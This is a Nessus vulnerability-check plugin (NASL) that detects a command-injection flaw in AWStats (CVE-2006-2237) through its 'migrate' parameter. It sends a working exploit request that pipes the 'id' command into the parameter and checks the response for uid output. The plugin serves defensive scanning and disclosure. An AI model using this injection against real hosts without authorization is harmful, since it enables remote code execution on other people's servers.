#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a CGI script that allows for the
execution of arbitrary commands. 

Description :

The remote host is running AWStats, a free logfile analysis tool
written in Perl. 

The version of AWStats installed on the remote host fails to sanitize
input to the 'migrate' parameter before passing it to a Perl 'open()'
function.  Provided 'AllowToUpdateStatsFromBrowser' is enabled in the
AWStats site configuration file, an unauthenticated attacker can
exploit this issue to execute arbitrary code on the affected host,
subject to the privileges of the web server user id. 

See also :

http://www.osreviews.net/reviews/comm/awstats
http://awstats.sourceforge.net/awstats_security_news.php

Solution :

Upgrade to AWStats version 6.6 or later.

Risk factor :

Medium / CVSS Base Score : 6 
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";


if (description)
{
  script_id(21328);
  script_version("$Revision: 1.2 $");

  script_cve_id("CVE-2006-2237");
  script_bugtraq_id(17844);
  if (defined_func("script_xref")) script_xref(name:"OSVDB", value:"25284");

  script_name(english:"AWStats migrate Parameter Remote File Include Vulnerability");
  script_summary(english:"Tries to run a command using AWStats");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);


# Loop through various directories.
foreach dir (cgi_dirs())
{
  # Exploit the flaw to run a command.
  cmd = "id";
  host = get_host_name();
  req = http_get(
    item:string(
      dir, "/awstats.pl?",
      "config=", host, "&",
      "migrate=|", cmd, ";exit|awstats052006.", host, ".txt"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  if (egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res))
  {
    res = strstr(res, "uid=");
    res = res - strstr(res, "<br");

    report = string(
      desc,
      "\n\n",
      "Plugin output :\n",
      "\n",
      "Nessus was able to execute the command 'id' on the remote host;\n",
      "the output was:\n",
      "\n",
      res
    );

    security_warning(port:port, data:report);
    exit(0);
  }
}
